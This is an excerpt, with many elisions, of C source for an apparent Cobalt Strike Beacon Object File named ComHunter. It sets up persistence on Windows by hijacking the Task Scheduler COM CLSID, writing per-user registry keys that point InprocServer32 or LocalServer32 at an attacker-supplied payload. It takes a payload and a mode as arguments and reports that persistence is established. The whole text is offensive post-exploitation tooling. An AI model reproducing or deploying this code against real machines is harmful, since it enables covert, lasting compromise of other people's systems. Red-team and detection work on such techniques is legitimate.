...
// Task Scheduler CLSID (hardcoded)
#define TASKSCH_CLSID "{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"

// Persist mode flags
#define COMHUNTER_TASKSCH_INPROCSERVER  0  // -i, --inprocserver32
#define COMHUNTER_TASKSCH_LOCALSERVER   1  // -l, --localserver32
...
DWORD CreateRegistryCU(const char* registryKey, const char* payload, const char* serverType)
{
    ...
    internal_printf("[+] Task Scheduler %s COM Hijacking Persistence Established!\n", serverType);
...
DWORD ComHunterTaskSch(const char* payload, int persistMode)
{
    DWORD dwErrorCode = ERROR_SUCCESS;
    ...
    BuildRegistryKey(TASKSCH_CLSID, inprocPath, localPath, sizeof(inprocPath));

    internal_printf("[*] Starting Task Scheduler Mode...\n");
    internal_printf("[*] CLSID: %s\n", TASKSCH_CLSID);
    internal_printf("[*] Payload: %s\n\n", payload);

    switch (persistMode)
    {
        case COMHUNTER_TASKSCH_INPROCSERVER:
            serverType = "InprocServer32";
            registryKey = inprocPath;
            break;

        case COMHUNTER_TASKSCH_LOCALSERVER:
...
) 
{
    ...
    dwErrorCode = ComHunterTaskSch(payload, persistMode);
    if(ERROR_SUCCESS != dwErrorCode)
    {
        BeaconPrintf(CALLBACK_ERROR, "ComHunterTaskSch failed: %lX\n", dwErrorCode);
        goto go_end;
    }
...
int main(int argc, char** argv)
{
    ...
    int persistMode = COMHUNTER_TASKSCH_INPROCSERVER;

    if (argc >= 3)
    {
        payload = argv[1];
        persistMode = atoi(argv[2]);
    }
